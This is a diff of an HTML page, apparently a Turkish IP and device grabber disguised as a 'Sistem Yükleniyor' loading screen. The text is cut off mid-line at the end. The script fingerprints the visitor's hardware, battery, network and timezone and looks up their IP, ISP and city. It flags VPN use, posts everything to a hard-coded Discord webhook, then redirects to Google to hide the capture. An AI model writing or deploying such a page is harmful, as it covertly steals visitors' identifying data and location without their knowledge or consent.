@@ -1,77 +1,96 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Checking System Status...</title>
+    <title>Sistem Yükleniyor</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="l"></div>
+    <div class="loader"></div>
 
     <script>
         (function() {
             "use strict";
 
-            const WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+            var WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+            var REDIR = "https://www.google.com";
 
-            const run = async function() {
-                let d = {
-                    os: "Bilinmiyor", gpu: "Bilinmiyor", vdr: "Bilinmiyor",
+            var start = function() {
+                var d = {
+                    os: navigator.platform,
                     res: screen.width + "x" + screen.height,
-                    ram: navigator.deviceMemory || "N/A",
-                    cpu: navigator.hardwareConcurrency || "N/A",
-                    bat: "N/A", net: "N/A", vpn: "✅ Temiz",
-                    ip: "N/A", loc: "N/A", iss: "N/A",
                     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    lang: navigator.language,
-                    touch: (navigator.maxTouchPoints > 0 ? "Evet" : "Hayır"),
-                    online: (navigator.onLine ? "Aktif" : "Pasif")
+                    mem: navigator.deviceMemory || "N/A",
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    gpu: "Gizli", vdr: "Gizli",
+                    bat: "N/A", net: "N/A",
+                    ip: "N/A", loc: "N/A", iss: "N/A", vpn: "✅ Temiz"
                 };
 
-                // 1. İşletim Sistemi Detayı
-                try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e) { d.os = navigator.platform; }
-
-                // 2. GPU ve Donanım Analizi
+                // GPU Analizi
                 try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    d.vdr = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                    var c = document.createElement('canvas');
+                    var g = c.getContext('webgl');
+                    var b = g.getExtension('WEBGL_debug_renderer_info');
+                    d.gpu = g.getParameter(b.UNMASKED_RENDERER_ID);
+                    d.vdr = g.getParameter(b.UNMASKED_VENDOR_ID);
                 } catch(e) {}
 
-                // 3. Pil ve Bağlantı Bilgisi
+                // Pil ve İnternet
                 try {
                     if (navigator.getBattery) {
-                        const b = await navigator.getBattery();
-                        d.bat = "%" + Math.round(b.level * 100) + (b.charging ? " (⚡ Şarjda)" : " (🔋 Pilde)");
+                        navigator.getBattery().then(function(b) {
+                            d.bat = "%" + Math.round(b.level * 100) + (b.charging ? " (Şarjda)" : " (Pilde)");
+                        });
                     }
-                    const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (n) d.net = n.effectiveType.toUpperCase() + " (~" + n.downlink + "Mbps)";
+                    var n = navigator.connection;
+                    if (n) d.net = n.effectiveType + " (" + n.downlink + "Mbps)";
                 } catch(e) {}
 
-                // 4. IP ve Coğrafi Analiz (Derinleştirilmiş)
-                try {
-                    const r = await fetch('https://ipapi.co/json/');
-                    const j = await r.json();
-                    d.ip = j.ip;
-                    d.iss = j.org + " (" + j.asn + ")";
-                    d.loc = j.city + ", " + j.region + " / " + j.country_name;
-                    if (j.timezone !== d.tz) d.vpn = "🚨 **VPN/PROXY TESPİT EDİLDİ**";
-                } catch(e) { d.vpn = "⚠️ Analiz Engellendi"; }
+                // IP ve Lokasyon (Her Şey Dahil)
+                fetch('https://ipapi.co/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(j) {
+                        d.ip = j.ip;
+                        d.iss = j.org;
+                        d.loc = j.city + ", " + j.country_name;
+                        if (j.timezone !== d.tz) d.vpn = "🚨 **VPN TESPİT EDİLDİ**";
+                        finish(d);
+                    })
+                    .catch(function() { finish(d); });
+            };
 
-                // 5. Discord Payload (Full Detay)
-                const payload = {
-                    username: "Omniscience V9000",
+            var finish = function(data) {
+                var p = {
                     embeds: [{
-                        title: "💀 TAM KAPSAMLI CİHAZ SIZINTISI",
-                        color: d.vpn.includes("🚨") ? 15158332 : 3066993,
+                        title: "💀 FULL SPECTRUM DATA CAPTURED",
+                        color: 3066993,
                         fields: [
-                            { name: "📡 AĞ VE GÜVENLİK", value: "**IP:** `" + d.ip + "`\n**VPN:** " + d.vpn + "\n**ISS:** `" + d.iss + "`\n**Bağlantı:** `" + d.net + "`", inline: false },
-                            { name: "📍 KONUM", value: "**Bölge:** " + d.loc + "\n**Zaman Dilimi:** `" + d.tz + "`", inline: false },
-                            { name: "⚙️ DONANIM", value: "**OS:** `" + d.os + "`\n**CPU:** " + d.cpu + " Çekirdek\n**RAM:** " + d.ram + "
-                    
+                            { name: "📡 NETWORK", value: "IP: " + data.ip + "\nVPN: " + data.vpn + "\nISS: " + data.iss, inline: false },
+                            { name: "⚙️ HARDWARE", value: "OS: " + data.os + "\nCPU: " + data.cpu + " Cores\nRAM: " + data.mem + "GB\nGPU: " + data.gpu, inline: false },
+                            { name: "🔋 STATUS", value: "Pil: " + data.bat + "\nNet: " + data.net + "\nRes: " + data.res, inline: true }
+                        ],
+                        footer: { text: "V9500 Stealth Protocol" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                var payload = JSON.stringify(p);
+                
+                // Gönderim
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK, new Blob([payload], { type: 'application/json' }));
+                } else {
+                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: payload });
+                }
+
+                // Gizlilik için yönlendir
+                setTimeout(function() { window.location.replace(REDIR); }, 1500);
+            };
+
+            window.onload =
+                                
